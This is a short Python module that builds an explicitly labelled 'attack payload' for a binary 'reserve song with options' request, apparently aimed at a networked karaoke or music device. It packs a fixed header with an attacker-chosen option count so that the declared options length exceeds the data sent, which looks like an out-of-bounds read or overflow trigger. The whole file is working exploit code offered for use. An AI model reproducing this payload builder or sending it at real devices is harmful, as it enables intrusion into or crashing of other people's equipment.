from logging import getLogger
import struct

__RESERVE_SONG_WITH_OPTIONS_REQUEST_MESSAGE_ID: bytes = b"\x51\x10"
__RESERVE_SONG_WITH_OPTIONS_REQUEST_PAYLOAD_FIXED_PART: bytes = (
    b"\x53\x50\x44\x45\x4e\x4d\x4f\x4b\x00\x00\x00\x00\x00\x00\x00\x00\x44\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
)

__logger = getLogger(__name__)


def make_payload(option_count: int) -> bytes:
    """Make attack payload

    Args:
        option_count (int, optional): Option count

    Returns:
        bytes: Attack payload
    """

    __logger.debug("Make attack payload.")
    message_payload = __RESERVE_SONG_WITH_OPTIONS_REQUEST_PAYLOAD_FIXED_PART
    options_length = 4 * option_count
    message_payload += struct.pack(">H", option_count)

    payload = __RESERVE_SONG_WITH_OPTIONS_REQUEST_MESSAGE_ID
    payload += struct.pack(">H", len(message_payload))
    payload += message_payload
    read_length = len(payload) + options_length
    __logger.debug(f"{hex(option_count)=} {hex(options_length)=} {hex(read_length)=}")
    __logger.debug(f"{payload.hex()=}")
    return payload
